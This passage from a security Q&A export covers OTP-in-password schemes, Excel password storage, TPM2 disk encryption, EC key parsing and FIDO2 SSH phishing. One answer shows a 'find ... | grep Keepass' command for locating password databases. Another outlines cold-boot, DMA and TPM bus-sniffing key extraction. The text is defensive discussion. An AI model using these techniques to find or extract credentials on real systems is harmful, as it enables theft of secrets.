<p>Most applications don't support an OTP factor. And if they do, it is a separate OTP per application. But the main password is checked centrally, almost always against a LDAP server (generally Active Directory) so all services share the same password.</p>
<p>If we change that authentication server to treat the password field as two parts (in your example, by the last six characters, other implementations use a separator between the parts), then all systems using that authentication backend automatically benefit from MFA. Remember that passwords should be opaque. The applications are oblivious to the change, as they are still just passing &quot;a username&quot; and &quot;a password&quot; to the backend for validation.</p>
<p>An implementation of this concept is <a href=""https://openldap.org/software/man.cgi?query=slapo-otp"" rel=""nofollow noreferrer"">the otp module of OpenLDAP</a>: <em>With this module, users would use their password, followed with the one-time password in the password prompt to authenticate</em>.</p>
<p>‎</p>
<p>‎</p>
<p>¹ from a security point of view, it's irrelevant whether there is a dedicated OTP field or not. You could even pack username, password and OTP on a single field.</p>
","0"
"260169","260169","Is it safe to store account credentials in an Excel sheet protected with a password?","<p>Basically the title. For example, how bad is it to store passwords in an Excel sheet protected with a password, instead of storing passwords in Keypass or something else like Zoho Vault? Of course, this sheet would be in a safe place as well: besides the password to open the sheet, an attacker would need the password to access the Google Drive account and a second factor authentication token from Google.</p>
","33","6","260172","<p><strong>No.</strong> At best, password-encrypted Excel sheets are only protected at rest, not while opened. At worst, it's not encrypted and/or an adversary can use one of several documented <a href=""https://en.wikipedia.org/wiki/Microsoft_Office_password_protection#Password_recovery_attacks"" rel=""nofollow noreferrer"" title=""Microsoft Office password protection § Password recovery attacks"">MS office password recovery attacks</a>.</p>
<p>It is unwise to assume that Excel's protections have anywhere near as much security vetting as <em>any</em> <a href=""https://en.wikipedia.org/wiki/Password_manager"" rel=""nofollow noreferrer"">password manager</a>, especially not the better-established ones like <a href=""https://en.wikipedia.org/wiki/Bitwarden"" rel=""nofollow noreferrer"">Bitwarden</a> and <a href=""https://en.wikipedia.org/wiki/1Password"" rel=""nofollow noreferrer"">1Password</a>.</p>
<p>In addition to being vetted for secure password storage, actual password managers include an interface that prevents you from seeing all passwords at the same time. They also have tons of extra features, like options to generate secure passwords, the ability to privately determine if a given password was part of a recent breach, and even the ability to wipe your clipboard a minute after you copy a password to it.</p>
<p>See also Wikipedia's <a href=""https://en.wikipedia.org/wiki/List_of_password_managers#Features"" rel=""nofollow noreferrer"">List of password managers § Features</a> matrix for a better list of what Excel can't offer but plenty of free options do.</p>
","64"
"260169","260169","Is it safe to store account credentials in an Excel sheet protected with a password?","<p>Basically the title. For example, how bad is it to store passwords in an Excel sheet protected with a password, instead of storing passwords in Keypass or something else like Zoho Vault? Of course, this sheet would be in a safe place as well: besides the password to open the sheet, an attacker would need the password to access the Google Drive account and a second factor authentication token from Google.</p>
","33","6","260183","<h1>No, absolutely not safe</h1>
<p><a href=""https://techcommunity.microsoft.com/t5/excel/how-to-unprotect-the-excel-sheet-if-forgot-the-password/m-p/1574559"" rel=""noreferrer"">Here</a> is the top google result for</p>
<blockquote>
<p>how to crack excel password</p>
</blockquote>
<p>It literally tells you how to open a password-&quot;protected&quot; excel spreadsheet.</p>
<p>There are dozens more articles on the same topic, and anyone can do it (that's right, while you do need to copy/paste some code, you do not even need to be a computer programer or need to know anything about 'hacking' to follow the steps).</p>
<p>This means, for better or worse, it's really easy for someone to open a password &quot;protected&quot; excel spreadsheet.</p>
<p>So the answer is <strong>no</strong> - you should not consider passwords stored in a excel spreadsheet secure, even if it's &quot;protected&quot; by a password.</p>
","6"
"260169","260169","Is it safe to store account credentials in an Excel sheet protected with a password?","<p>Basically the title. For example, how bad is it to store passwords in an Excel sheet protected with a password, instead of storing passwords in Keypass or something else like Zoho Vault? Of course, this sheet would be in a safe place as well: besides the password to open the sheet, an attacker would need the password to access the Google Drive account and a second factor authentication token from Google.</p>
","33","6","260186","<p>Probably not, but it depends on your threat model.</p>
<p>What are you trying to protect AGAINST ?</p>
<p>If your main concern is that you forget passwords and that some low-level attacker might get them, then you may be ok. If you want to be safe from anyone with even some skill, then no. Excel is not safe.</p>
<p>A password manager is probably the better solution, and you didn't explain why you don't want that.</p>
<p>The next best solution if you need to store the passwords somewhere is to store them physical, on a piece of paper in a safe. The number of potential attackers drops dramatically as soon as physical intrusion is required. Again, details depend on your threat model.</p>
","6"
"260169","260169","Is it safe to store account credentials in an Excel sheet protected with a password?","<p>Basically the title. For example, how bad is it to store passwords in an Excel sheet protected with a password, instead of storing passwords in Keypass or something else like Zoho Vault? Of course, this sheet would be in a safe place as well: besides the password to open the sheet, an attacker would need the password to access the Google Drive account and a second factor authentication token from Google.</p>
","33","6","260194","<p>This is not safe for the reasons stated in other answers, however a quick alternative for the same <s>stuffy offices</s> environments where Excel is being used is often to pack the spreadsheet into an archive (such as the <a href=""https://en.wikipedia.org/wiki/ZIP_(file_format)"" rel=""nofollow noreferrer"">ZIP format</a>), encrypting that with a password</p>
<p>This is quite secure, though it requires a long passphrase and reasonable choice of encryption (consider AES128), as it trivially permits offline attacks against the file (while an online password manager will not)</p>
","1"
"260169","260169","Is it safe to store account credentials in an Excel sheet protected with a password?","<p>Basically the title. For example, how bad is it to store passwords in an Excel sheet protected with a password, instead of storing passwords in Keypass or something else like Zoho Vault? Of course, this sheet would be in a safe place as well: besides the password to open the sheet, an attacker would need the password to access the Google Drive account and a second factor authentication token from Google.</p>
","33","6","260202","<p>In the existing answers, a lot of &quot;Excel is not secure&quot; gets thrown around, so let's look at what this means in detail.</p>
<p>First, we need to establish <em>which</em> Excel feature we are talking about. There are two fundamentally different ways to &quot;protect an Excel sheet with a password&quot;.</p>
<ol>
<li><p><strong>File encryption</strong>: This is what Microsoft calls <a href=""https://support.microsoft.com/en-us/office/protect-an-excel-file-7359d4ae-7213-4ac2-b058-f75e9311b599"" rel=""noreferrer"">&quot;Protect an Excel file&quot;</a>. This feature encrypts the whole file with symmetric encryption:</p>
<ul>
<li>Office 2016 and later <a href=""https://docs.microsoft.com/en-us/deployoffice/security/cryptography-and-encryption-in-office"" rel=""noreferrer"">use</a>
<ul>
<li>256-bit AES when encrypting Office Open XML files (docx, xlsx, ...),</li>
<li>RC4 (considered insecure) when encrypting files in the legacy formats (doc, xls, ...).</li>
</ul>
</li>
<li>Office 2007–2013 uses 128-bit AES for Office Open XML files</li>
<li>earlier versions of Office <a href=""https://en.wikipedia.org/wiki/Microsoft_Office_password_protection#History_of_Microsoft_Encryption_password"" rel=""noreferrer"">used various algorithms which are now considered insecure</a>.</li>
</ul>
</li>
<li><p><strong>Locking a workbook or worksheet</strong>. This is what Microsoft calls <a href=""https://support.microsoft.com/en-us/office/protect-a-workbook-7e365a4d-3e89-4616-84ca-1931257c1517"" rel=""noreferrer"">&quot;Protect a workbook&quot;</a> and <a href=""https://support.microsoft.com/en-us/office/protect-a-worksheet-3179efdb-1285-4d49-a9c3-f4ca36276de6"" rel=""noreferrer"">&quot;Protect a worksheet&quot;</a>. Microsoft explicitly states that <a href=""https://support.microsoft.com/en-us/office/protect-a-worksheet-3179efdb-1285-4d49-a9c3-f4ca36276de6"" rel=""noreferrer"">&quot;Worksheet level protection is not intended as a security feature&quot;</a>. This kind of protection can easily be bypassed by a skilled user by <a href=""http://blog.bitcollectors.com/adam/2011/10/how-to-unprotect-a-password-protected-xlsx-file/"" rel=""noreferrer"">modifying the XLSX file</a>. It's a convenience feature that protects designated cells in your file (a) from accidental modification by users and (b) from deliberate modification by unskilled users.</p>
</li>
</ol>
<p>Thus, from a cryptographic point of view, feature 2 is <em>absolutely insecure</em>, whereas feature 1 offers reasonable at-rest encryption when used with a strong password in current versions of Excel.</p>
<hr />
<p>However, as <a href=""https://security.stackexchange.com/a/260172/12244"">Adam Katz's answer</a> describes in more detail, good at-rest encryption is not the only important factor when choosing a password manager.</p>
<p>Thus, while storing your passwords in an encrypted Excel file is</p>
<ul>
<li><p><em>more secure</em> than storing them unencrypted (or reusing a single password for multiple accounts), it is also</p>
</li>
<li><p><em>less secure</em> than using dedicated password manager software (or keeping your passwords off-line).</p>
</li>
</ul>
","36"
"260169","260169","Is it safe to store account credentials in an Excel sheet protected with a password?","<p>Basically the title. For example, how bad is it to store passwords in an Excel sheet protected with a password, instead of storing passwords in Keypass or something else like Zoho Vault? Of course, this sheet would be in a safe place as well: besides the password to open the sheet, an attacker would need the password to access the Google Drive account and a second factor authentication token from Google.</p>
","33","6","260224","<p>As a counterpoint to the intuitive &quot;no, Excel is not a password manager&quot; I'd like to present a threat model in which the Excel-stored password is safer.</p>
<p>Most scenarios in which Excel-vs-password-manager make a difference involve an attacker accessing your system (<a href=""https://security.stackexchange.com/a/260172/4758"">password-encrypted Excel sheets are only protected at rest, etc.</a>). In such a case, it would be trivial to search for e.g. Keepass files.</p>
<pre><code>$ find / -type f -exec file {} \; | grep Keepass
/home/appelbaum/.well-hidden.kbd: Keepass password database 2.x KDBX
</code></pre>
<p>Finding Excel files is no harder, but with Excel files:</p>
<ol>
<li>The value of the file is not obvious. The attacker might not think to look for the passwords in an Excel file, especially if the target is tech-savy and there are decoy Keepass files on the system.</li>
<li>There could plausibly be hundreds of Excel files, difficult to determine which could contain valuable information.</li>
<li>Excel is a proprietary format, notoriously difficult to implement 100%. Automated tools might be able to sniff many ways of hiding data in Excel, but only MS Excel implements all of it. You could probably find a way to obfuscate the data in an Excel cell that is not obviously either a password or protected somehow. Automated tools might find encrypted files or protected cells, but they won't suspect that <code>Mary's birthday was last Thursday</code> <a href=""https://rot13.com/"" rel=""nofollow noreferrer"">encodes</a> the password <code>Znel'foveguqnljnfynfgGuhefqnl</code>.</li>
</ol>
<p>All these considerations apply to a file stored on Google Drive or other cloud platform as well. In fact, if the attacker is a state actor and can subpoena Google, the last point becomes even more poignant.</p>
","-3"
"260158","260158","Can TPM2 disk encryption protect data after full server theft?","<p>I read about TPM2 with PCR locking full-disk encryption from different sources. For example [1]. What I can't understand is how much does this protect from full server theft.</p>
<p>If we assume that TPM2 module is secure (attacker can't read it), proper PCR locking is implemented and direct reading RAM of the system is not a concern either, then can encryption key be obtained and disk read by attacker?</p>
<p>Does secure boot and/or bootloader locking affect the above question?</p>
<p>Update: I would like to see a list of things that need to be setup so that full disk encryption with TPM (without pin) protects against getting hands on decrypted data and/or encryption key. e.g. is secure boot required, should grub be locked for editing options, etc.</p>
<p>[1] <a href=""http://0pointer.net/blog/unlocking-luks2-volumes-with-tpm2-fido2-pkcs11-security-hardware-on-systemd-248.html"" rel=""nofollow noreferrer"">http://0pointer.net/blog/unlocking-luks2-volumes-with-tpm2-fido2-pkcs11-security-hardware-on-systemd-248.html</a></p>
","0","4","260160","<p>The TPM by itself does not protect the system.</p>
<p>To gain real protection you need to:</p>
<ul>
<li>involve the TPM in the boot sequence</li>
<li>make sure every part of the boot loader is verified by the previous part and uses the TPM</li>
<li>encrypt the disk (and as much of the boot loader as possible) with a key from the TPM, with that key locked to the hashes in the PCR for all the previous parts</li>
<li>make sure every part of the boot loader and subsequent operating system is secure, including administrative access and passwords</li>
</ul>
<p>If any part of this chain fails, it may be possible to break into the system.</p>
<p>It is also possible to tie the disk encryption to not just the TPM but also some network resource that would be unavailable after the machine is stolen.  This would further increase security and make it harder to crack.</p>
","0"
"260158","260158","Can TPM2 disk encryption protect data after full server theft?","<p>I read about TPM2 with PCR locking full-disk encryption from different sources. For example [1]. What I can't understand is how much does this protect from full server theft.</p>
<p>If we assume that TPM2 module is secure (attacker can't read it), proper PCR locking is implemented and direct reading RAM of the system is not a concern either, then can encryption key be obtained and disk read by attacker?</p>
<p>Does secure boot and/or bootloader locking affect the above question?</p>
<p>Update: I would like to see a list of things that need to be setup so that full disk encryption with TPM (without pin) protects against getting hands on decrypted data and/or encryption key. e.g. is secure boot required, should grub be locked for editing options, etc.</p>
<p>[1] <a href=""http://0pointer.net/blog/unlocking-luks2-volumes-with-tpm2-fido2-pkcs11-security-hardware-on-systemd-248.html"" rel=""nofollow noreferrer"">http://0pointer.net/blog/unlocking-luks2-volumes-with-tpm2-fido2-pkcs11-security-hardware-on-systemd-248.html</a></p>
","0","4","260161","<p>TPM2 should be seen as a security device (smarcard or key) that physically resides on the machine. If the full server is theft, the result is the same as if the attacker could steal both the disk and the FIDO key or smartcard containing the decrypting credentials:</p>
<ul>
<li>it is not possible to extract a private key from the TPM2 module exactly the same it cannot be extracted from a FIDO key or smartcard</li>
<li>unless the private key is protected with a password it can be used as soon as you have the security device</li>
</ul>
<p>That means that a TPM2 module will offer a strong security against any <em>at rest</em> attack consisting of stealing backups or any other offline copy <em>until the attacker also takes the server hardware and the TMP2 module</em>.</p>
<p>IT worlds seems to contain a good deal of magic, but if you go deep enough no true magic remains and everything boils down to <em>where is the final key</em>. If the final key is the TPM2 module and the attacker could steal the hardware, then they can decrypt anything. And if the final key is not the TPM2 but is a pass phrase used to decrypt the key, no unattented reboot is possible because someone has to give that damned pass phrase.</p>
","2"
"260158","260158","Can TPM2 disk encryption protect data after full server theft?","<p>I read about TPM2 with PCR locking full-disk encryption from different sources. For example [1]. What I can't understand is how much does this protect from full server theft.</p>
<p>If we assume that TPM2 module is secure (attacker can't read it), proper PCR locking is implemented and direct reading RAM of the system is not a concern either, then can encryption key be obtained and disk read by attacker?</p>
<p>Does secure boot and/or bootloader locking affect the above question?</p>
<p>Update: I would like to see a list of things that need to be setup so that full disk encryption with TPM (without pin) protects against getting hands on decrypted data and/or encryption key. e.g. is secure boot required, should grub be locked for editing options, etc.</p>
<p>[1] <a href=""http://0pointer.net/blog/unlocking-luks2-volumes-with-tpm2-fido2-pkcs11-security-hardware-on-systemd-248.html"" rel=""nofollow noreferrer"">http://0pointer.net/blog/unlocking-luks2-volumes-with-tpm2-fido2-pkcs11-security-hardware-on-systemd-248.html</a></p>
","0","4","260165","<p>Using a a full disk encryption that incorporated a TPM protected the boot process form changes.</p>
<p>As we are talking about a server unattended boot can be expected to be a requirement, hence TPM has been set-up without PIN. So anybody can boot up the machine but not modify the boot process.</p>
<p>So the problems start when the system is booted up. At that time the master encryption key has been loaded into memory and if you have physical access to the server there are a number of attacks that might reveal the master key in memory. Which of those attacks are really feasibly depends on the security measures used by the system:</p>
<ol>
<li><p>With physical access to the server you can cool down the RAM modules remove power. Then remove the RAM modules and transfer them into a second server and read out the content. Some server CPUs provide functions to encrypt RAM, if that measure is available and used at least for the disk encryption key(s) then this attack should not succeed.</p>
</li>
<li><p>Several bus systems in a server allow direct memory access (DMA). Even is the bus type is not hot-pluggable in reality you can succeed e.g. inserting a hardware component at run-time. This components then can make use of DMA and try to read-out the master encryption key from RAM. Since a few years CPUs have features to limit DMA access but I don't know any details how to test if this feature is used or not for a disk encryption. Also memory encryption should prevent this attack, too.</p>
</li>
<li><p>The TPM chip is usually connected using a LPC bus system to the chipset/CPU. This bus is pretty simply by default uses plaintext communication which allows sniffing the transmitted master encryption key when it is transferred from TPM to the CPU/RAM. Such an attack is feasible in reality as described by <a href=""https://pulsesecurity.co.nz/articles/TPM-sniffing"" rel=""nofollow noreferrer"">Pulse Security</a>. Furthermore they explain that TPM 2.0 would support transport encryption but Windows Bitlocker in Windows 10 at that time did not made use transport encryption measures. Not sure if this is now still the case and if Bitlocker was improved for Windows 11.</p>
</li>
</ol>
","1"
"260158","260158","Can TPM2 disk encryption protect data after full server theft?","<p>I read about TPM2 with PCR locking full-disk encryption from different sources. For example [1]. What I can't understand is how much does this protect from full server theft.</p>
<p>If we assume that TPM2 module is secure (attacker can't read it), proper PCR locking is implemented and direct reading RAM of the system is not a concern either, then can encryption key be obtained and disk read by attacker?</p>
<p>Does secure boot and/or bootloader locking affect the above question?</p>
<p>Update: I would like to see a list of things that need to be setup so that full disk encryption with TPM (without pin) protects against getting hands on decrypted data and/or encryption key. e.g. is secure boot required, should grub be locked for editing options, etc.</p>
<p>[1] <a href=""http://0pointer.net/blog/unlocking-luks2-volumes-with-tpm2-fido2-pkcs11-security-hardware-on-systemd-248.html"" rel=""nofollow noreferrer"">http://0pointer.net/blog/unlocking-luks2-volumes-with-tpm2-fido2-pkcs11-security-hardware-on-systemd-248.html</a></p>
","0","4","260328","<p>Considering full sever-theft means physical theft. TPM2.0 with certain configuration can keep the data inside HDD secure even after the physical theft.</p>
<p>Configure the system with secure and trusted boot. Hard disk encryption key should be locked with PCR (known as sealing) and encryption key have a PIN set for unlocking.</p>
<p>Now, with this configuration, an attacker must enter the unlocking PIN to release the key. TPM2.0 has protection measure for this such as locking period (default is 24hr AFAIK) in case of Dictionary attack etc. There are some other measures as well, such as cpHash and rpHash store for command parameters and response parameters, and   physical tempering measures as well.</p>
<p>Whereas, without a PIN set up, an attacker can boot up the system without changing the boot process and only has to work on cracking the system login. Once an attacker is logged in the system with an Admin/Root account, TPM can be modified to store the new hashes in PCR. System boot-loader can also be modified. There are some known attacks on TPM2.0 where the unlocking PIN was not setup and researchers were able to extract the key. (<a href=""https://arstechnica.com/gadgets/2021/08/how-to-go-from-stolen-pc-to-network-intrusion-in-30-minutes/"" rel=""nofollow noreferrer"">Sniffing data through SPI BUS</a>)</p>
<p>But even the above-mentioned secure configuration will only buy more time since once the attacker has the physical possession all the bets are off. Because at some point an attacker will be able to crack the system with enough resources and time (technological advancement, guessing of PIN, vulnerabilities etc.)</p>
","0"
"260145","260145","What format is this private key in, and how can I process it using bouncycastle?","<p>I have the following private key. I'd like to be able to process it into an instance of ECPrivateKey using Bouncycastle (or the builtin Java security API if bouncycastle isn't necessary).</p>
<pre><code>-----BEGIN EC PRIVATE KEY-----
MIGTAgEAMBMGByqGSM49AgEGCCqGSM49AwEHBHkwdwIBAQQgtqnvswtIdNxKy07B
D3Y9vvlpwvSDqWCvyWmWTNea2ImgCgYIKoZIzj0DAQehRANCAATa0LtPPOI+De/u
RY1vSxR7gFGSoyjaDZyif/sWujLZWEj6Rc2IEl62VfWQD3GeYCEEKP9qzpOGyO+b
HWR98kNd
-----END EC PRIVATE KEY-----
</code></pre>
","0","3","260148","<p>An EC private key is nothing more than a 256-bit integer.  You can use openssl to extract the private key (as a 256-bit integer) from the PEM file.</p>
<p>Try saving the PEM file that you posted on your system as private.pem.  Then, use the following openssl command to extract the private key from the PEM file:</p>
<pre><code>openssl ec -noout -text -inform PEM -in private.pem
</code></pre>
<p>This should produce:</p>
<pre><code>read EC key
Private-Key: (256 bit)
priv:
    b6:a9:ef:b3:0b:48:74:dc:4a:cb:4e:c1:0f:76:3d:
    be:f9:69:c2:f4:83:a9:60:af:c9:69:96:4c:d7:9a:
    d8:89
pub:
    04:da:d0:bb:4f:3c:e2:3e:0d:ef:ee:45:8d:6f:4b:
    14:7b:80:51:92:a3:28:da:0d:9c:a2:7f:fb:16:ba:
    32:d9:58:48:fa:45:cd:88:12:5e:b6:55:f5:90:0f:
    71:9e:60:21:04:28:ff:6a:ce:93:86:c8:ef:9b:1d:
    64:7d:f2:43:5d
ASN1 OID: prime256v1
NIST CURVE: P-256
</code></pre>
<p>As you can see, the private key is displayed as a 256-bit integer in hexadecimal format.  With the private key now in its raw format, it should be possible to consume in any environment.</p>
","0"
"260145","260145","What format is this private key in, and how can I process it using bouncycastle?","<p>I have the following private key. I'd like to be able to process it into an instance of ECPrivateKey using Bouncycastle (or the builtin Java security API if bouncycastle isn't necessary).</p>
<pre><code>-----BEGIN EC PRIVATE KEY-----
MIGTAgEAMBMGByqGSM49AgEGCCqGSM49AwEHBHkwdwIBAQQgtqnvswtIdNxKy07B
D3Y9vvlpwvSDqWCvyWmWTNea2ImgCgYIKoZIzj0DAQehRANCAATa0LtPPOI+De/u
RY1vSxR7gFGSoyjaDZyif/sWujLZWEj6Rc2IEl62VfWQD3GeYCEEKP9qzpOGyO+b
HWR98kNd
-----END EC PRIVATE KEY-----
</code></pre>
","0","3","266783","<p>You can use Bouncy Castle to convert the private key into an instance of ECPrivateKey using the following code:</p>
<pre><code>// Create a Bouncy Castle provider
Provider bcProvider = new BouncyCastleProvider();
// Load the private key
String privateKeyString = &quot;-----BEGIN EC PRIVATE KEY-----\nMIGTAgEAMBMGByqGSM49AgEGCCqGSM49AwEHBHkwdwIBAQQgtqnvswtIdNxKy07B\nD3Y9vvlpwvSDqWCvyWmWTNea2ImgCgYIKoZIzj0DAQehRANCAATa0LtPPOI+De/u\nRY1vSxR7gFGSoyjaDZyif/sWujLZWEj6Rc2IEl62VfWQD3GeYCEEKP9qzpOGyO+b\nHWR98kNd\n-----END EC PRIVATE KEY-----&quot;;

// Get an instance of ECPrivateKey
ECPrivateKey privateKey
</code></pre>
","0"
"260145","260145","What format is this private key in, and how can I process it using bouncycastle?","<p>I have the following private key. I'd like to be able to process it into an instance of ECPrivateKey using Bouncycastle (or the builtin Java security API if bouncycastle isn't necessary).</p>
<pre><code>-----BEGIN EC PRIVATE KEY-----
MIGTAgEAMBMGByqGSM49AgEGCCqGSM49AwEHBHkwdwIBAQQgtqnvswtIdNxKy07B
D3Y9vvlpwvSDqWCvyWmWTNea2ImgCgYIKoZIzj0DAQehRANCAATa0LtPPOI+De/u
RY1vSxR7gFGSoyjaDZyif/sWujLZWEj6Rc2IEl62VfWQD3GeYCEEKP9qzpOGyO+b
HWR98kNd
-----END EC PRIVATE KEY-----
</code></pre>
","0","3","266785","<p>Yes, this is one of the PEM formats used by OpenSSL and supported by BouncyCastle's <a href=""https://github.com/bcgit/bc-java/blob/master/pkix/src/main/java/org/bouncycastle/openssl/PEMParser.java"" rel=""nofollow noreferrer"">PEMParser</a> and <a href=""https://github.com/bcgit/bc-java/blob/master/pkix/src/main/java/org/bouncycastle/openssl/jcajce/JcaPEMKeyConverter.java"" rel=""nofollow noreferrer"">JcaPEMKeyConverter</a> classes. Like other OpenSSL 'traditional' PEM formats, this actually produces a <code>KeyPair</code> object from which <code>.getPrivate()</code> gives you the privatekey object which implements, among other things, the <code>ECPrivateKey</code> interface.</p>
<p>Without Bouncy, if you get the <em>curve AND</em> numeric value of the raw private key, per mti2935's answer, you can put them in an <code>ECPrivateKeySpec</code> and run them through the <code>generatePrivate()</code> method of a <code>KeyFactory</code> returned from <code>getInstance(&quot;EC&quot;)</code> -- OR you can take the SEC1-format data from that file, after removing the BEGIN/END lines and de-Base64-ing, and add a fixed-per-curve prefix to make it <em>PKCS8</em> format, which you can put in <code>PKCS8EncodedKeySpec</code> and feed to a <code>KeyFactory</code> instance as above. For examples of both options (but for a different curve, secp256k1), see my answer at <a href=""https://stackoverflow.com/questions/48832170/generate-ec-public-key-from-byte-array-private-key-in-native-java-7"">https://stackoverflow.com/questions/48832170/generate-ec-public-key-from-byte-array-private-key-in-native-java-7</a> (ignoring the parts about using the resulting private key object to compute the public key).</p>
","0"
"260138","260138","Why are FIDO2 protected SSH keys affected by phishing attacks?","<p>The OpenSSH developers have written in a description of the &quot;agent restrictions&quot; feature that FIDO2 tokens are vulnerable to phishing attacks: <a href=""https://www.openssh.com/agent-restrict.html"" rel=""nofollow noreferrer"">https://www.openssh.com/agent-restrict.html</a></p>
<blockquote>
<p>FIDO keys that require user-presence confirmation offer a little more defence, but are also similarly phishable.</p>
</blockquote>
<p>However, on the FIDO Alliance page it is written that FIDO2 tokens protect against phishing attacks: <a href=""https://fidoalliance.org/fido2/"" rel=""nofollow noreferrer"">https://fidoalliance.org/fido2/</a></p>
<blockquote>
<p>This security model eliminates the risks of phishing, all forms of password theft and replay attacks.</p>
</blockquote>
<p><strong>Questions:</strong></p>
<ul>
<li>Why are FIDO2 protected SSH keys affected by phishing attacks?</li>
<li>Is it already known how the phishing attack mentioned by
OpenSSH is supposed to work?</li>
<li>Why is this not also true for SSH or why has SSH been vulnerable to phishing attacks so far?</li>
</ul>
","0","3","260140","<p>You are comparing apples and oranges.</p>
<p>FIDO2 defends against the phishing of credentials. I can set up a fake website and capture credentials, but I would still need to get the TOTP seed to be able to use those credentials on the real site.</p>
<p>But with the OpenSSH article, they are talking about <em><strong>proxying</strong></em> the authentication. Once you forward the agent to an attacker, as it explains, the control goes to the attacker. And it also means that the user's interaction with the FIDO key goes through to the attacker. Once the attacker gets this result, then they can log in to the target. Hence the addition of the indication to the user that the agent has been forwarded.</p>
<p><a href=""https://threatpost.com/low-detection-phishing-kits-bypass-mfa/178208/"" rel=""nofollow noreferrer"">MFA for websites has this vulnerability</a>, too. If an attacker can insert themselves, they can capture TOTP codes and use them on behalf of the user.</p>
<p>Please remember that &quot;phishing&quot; can mean a lot of different things and the context really matters. You can't read &quot;eliminates the risks of phishing&quot; and assume that it applies in all contexts all the time in perpetuity. Context matters. The FIDO page explains its context. You can't carry that context over to a completely different problem.</p>
","2"
"260138","260138","Why are FIDO2 protected SSH keys affected by phishing attacks?","<p>The OpenSSH developers have written in a description of the &quot;agent restrictions&quot; feature that FIDO2 tokens are vulnerable to phishing attacks: <a href=""https://www.openssh.com/agent-restrict.html"" rel=""nofollow noreferrer"">https://www.openssh.com/agent-restrict.html</a></p>
<blockquote>
<p>FIDO keys that require user-presence confirmation offer a little more defence, but are also similarly phishable.</p>
</blockquote>
<p>However, on the FIDO Alliance page it is written that FIDO2 tokens protect against phishing attacks: <a href=""https://fidoalliance.org/fido2/"" rel=""nofollow noreferrer"">https://fidoalliance.org/fido2/</a></p>
<blockquote>
<p>This security model eliminates the risks of phishing, all forms of password theft and replay attacks.</p>
</blockquote>
<p><strong>Questions:</strong></p>
<ul>
<li>Why are FIDO2 protected SSH keys affected by phishing attacks?</li>
<li>Is it already known how the phishing attack mentioned by
OpenSSH is supposed to work?</li>
<li>Why is this not also true for SSH or why has SSH been vulnerable to phishing attacks so far?</li>
</ul>
","0","3","260153","<p>These are different contexts.</p>
<p>When you're using a FIDO2 token as part of a WebAuthn request, your browser, a trusted party, sends the actual website you're visiting, in addition to the data you're receiving from the website, to your token.  Your token generates a response based on that data.  In this context, phishing is not possible because the remote party (the domain) is attested to by a trusted party (the browser), and the response is cryptographically dependent on that data.</p>
<p>In the context of an SSH agent being forwarded to a remote machine, we cannot know if the ultimate system is actually who they say they are.  The only trusted party here is our local machine, and if we've connected to A, forwarding our agent, and then attempt from there to connect to B, we cannot necessarily trust A or B to be honest about further connections.  There is no trusted party to attest to the remote system's identity.</p>
<p>However, with the new SSH protocol extension, the data that's involved in the request for the signature now includes the server's host key.  Because we can generally assume that only the server in question has access to their host key, the signature is cryptographically bound to the destination system, and thus phishing and forgery are not possible if the server only accepts valid signatures.</p>
<p>Thus, the ultimate determinant as to whether a FIDO2 key (or, for that matter, any cryptographic material) is subject to phishing is essentially whether the specific request is bound cryptographically to the remote system in such a way that it cannot be tampered with, forged, or replayed by a proxying system (the party doing the phishing).</p>
","3"
"260138","260138","Why are FIDO2 protected SSH keys affected by phishing attacks?","<p>The OpenSSH developers have written in a description of the &quot;agent restrictions&quot; feature that FIDO2 tokens are vulnerable to phishing attacks: <a href=""https://www.openssh.com/agent-restrict.html"" rel=""nofollow noreferrer"">https://www.openssh.com/agent-restrict.html</a></p>
<blockquote>
<p>FIDO keys that require user-presence confirmation offer a little more defence, but are also similarly phishable.</p>
</blockquote>
<p>However, on the FIDO Alliance page it is written that FIDO2 tokens protect against phishing attacks: <a href=""https://fidoalliance.org/fido2/"" rel=""nofollow noreferrer"">https://fidoalliance.org/fido2/</a></p>
<blockquote>
<p>This security model eliminates the risks of phishing, all forms of password theft and replay attacks.</p>
</blockquote>
<p><strong>Questions:</strong></p>
<ul>
<li>Why are FIDO2 protected SSH keys affected by phishing attacks?</li>
<li>Is it already known how the phishing attack mentioned by
OpenSSH is supposed to work?</li>
<li>Why is this not also true for SSH or why has SSH been vulnerable to phishing attacks so far?</li>
</ul>
","0","3","260228","<h1>Introduction</h1>
<h2>Webauthn vs ssh authentication protocol</h2>
<p>OpenSSH's implementation is not related with webauthn. Those are different protocols. In OpenSSH the FIDO/FIDO2 token is used to allow the usage of the private key. This does not change the ssh's authentication protocol.</p>
<p>Webauthn works different. It's a complete new authentication protocol, which does not have any similarities with the ssh authentication protocol. The browser can verify the website and communicates with the FIDO2 token (trusted party). The website (Domain/URL) and some channel id's are part of the authentication process. Those information can not be faked. This is the reason, why it's not possible to authenticate against a phishing site and reuse the credentials.</p>
<p>Using FIDO2 with webauthn is secure and protects against phishing attacks.</p>
<h2>SSH and phishing attacks</h2>
<p>SSH should not be affected by phishing attacks, if you verify the fingerprint or compare it against a trusted source. The reason why such phishing attacks work is, that most users does not verify the fingerprint during the first connection.</p>
<p>When the fingerprint is already known, but the host key changes, a warning is presented and the connection is closed. This should prevent from attacks like ARP Spoofing.</p>
<p>In the scenario of &quot;agent restrictions&quot; we are not talking about such phishing attacks. They might be part of the attack but not the attack which was meant by the Damien Miller (OpenSSH dev).</p>
<h2>&quot;no-touch-required&quot; option for FIDO tokens</h2>
<p>FIDO tokens are supported since OpenSSH 8.2. Compatible FIDO/FIDO2 tokens must support U2F and they must support &quot;ECDSA-P256&quot; and &quot;Ed25519&quot;. There are some optional features like &quot;no-touch-required&quot; and &quot;resident keys&quot;.</p>
<p>When &quot;no-touch-required&quot; is used, they private key can be used without confirmation and such keys can be abused at any time. The &quot;no-touch-required&quot; is not discussed in the article, because it disables the second factor and a phishing attack is not required.</p>
<h1>The phishing attack</h1>
<p>The phishing attack is called &quot;<a href=""https://docs.ssh-mitm.at/trivialauth.html"" rel=""nofollow noreferrer"">trivial authentication</a>&quot; and was first described in <a href=""https://bugzilla.mindrot.org/show_bug.cgi?id=3316"" rel=""nofollow noreferrer"">Bug 3316</a> in the OpenSSH issue tracker.</p>
<p>Simon Tatham (PuTTY) and Matt Johnston (Dropbear) has also <a href=""https://git.tartarus.org/?p=simon/putty.git;a=commitdiff;h=1dc5659aa62848f0aeb5de7bd3839fecc7debefa"" rel=""nofollow noreferrer"">improved existing mitigation strategies</a> or <a href=""https://github.com/mkj/dropbear/pull/128"" rel=""nofollow noreferrer"">implemented some mitigation strategies</a>  against the described phishing attack.</p>
<h2>Scenario</h2>
